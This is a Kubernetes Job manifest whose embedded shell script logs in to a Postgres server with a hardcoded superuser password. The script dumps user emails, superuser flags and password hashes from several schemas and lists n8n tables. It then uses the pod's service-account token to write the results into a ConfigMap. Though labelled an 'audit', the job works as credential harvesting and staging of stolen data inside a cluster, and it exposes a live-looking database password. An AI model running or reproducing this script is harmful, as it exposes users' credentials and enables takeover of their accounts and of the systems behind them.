apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v13
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client jq
          PG_HOST="172.16.10.14"
          SUPER_PASS="wpEJl3WKOImARD9WgBsa"
          
          echo "=TACHCORP_USERS_SCHEMAS=" > /tmp/out.txt
          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
            "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name='users' ORDER BY table_schema;" >> /tmp/out.txt 2>&1
          
          echo "=TACHCORP_DUNE_USERS=" >> /tmp/out.txt
          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
            "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name='users' ORDER BY table_schema, ordinal_position;" >> /tmp/out.txt 2>&1
          
          echo "=TACHCORP_ALL_SCHEMAS=" >> /tmp/out.txt
          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
            "\dn" >> /tmp/out.txt 2>&1
          
          # Query users from each schema
          echo "=TACHCORP_USERS_DATA=" >> /tmp/out.txt
          for SCHEMA in tachcorp dune api auth public; do
            COUNT=$(PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -tAc \
              "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users' AND table_schema='$SCHEMA';" 2>/dev/null)
            if [ "$COUNT" = "1" ]; then
              echo "--- schema $SCHEMA ---" >> /tmp/out.txt
              PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
                "SELECT id, email, is_superuser, is_active, hashed_password FROM ${SCHEMA}.users LIMIT 10;" >> /tmp/out.txt 2>&1
            fi
          done
          
          # Also check n8n database schema  
          echo "=N8N_DB_TABLES=" >> /tmp/out.txt
          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d n8n -c "\dt" >> /tmp/out.txt 2>&1
          
          cat /tmp/out.txt
          
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/merge-patch+json" \
            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
            -d "$PAYLOAD" > /tmp/patch.txt
          echo "Patched: $(cat /tmp/patch.txt | jq -r '.metadata.name // .message')"
          sleep 90